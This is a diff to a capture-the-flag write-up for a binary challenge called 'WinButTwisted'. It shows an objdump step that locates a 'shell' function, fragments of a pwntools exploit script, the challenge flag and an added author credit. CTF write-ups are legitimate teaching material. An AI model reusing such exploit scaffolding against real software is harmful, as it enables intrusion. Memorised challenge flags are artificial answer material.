@@ -197,7 +197,7 @@ objdump -d WinButTwisted | grep shell
 08049999 <shell>:
 ```
 
-Now let's write the exploit
+Now let's write the full exploit
 ```Python3
 from pwn import *
 
@@ -209,3 +209,5 @@ r.interactive()
 
 #flag --> Hero{Tw1sT3D_w1N_FuNcTi0N}
 ```
+Voilà.. here's the flag
+Writeup written by FeeeDz from STNKS team
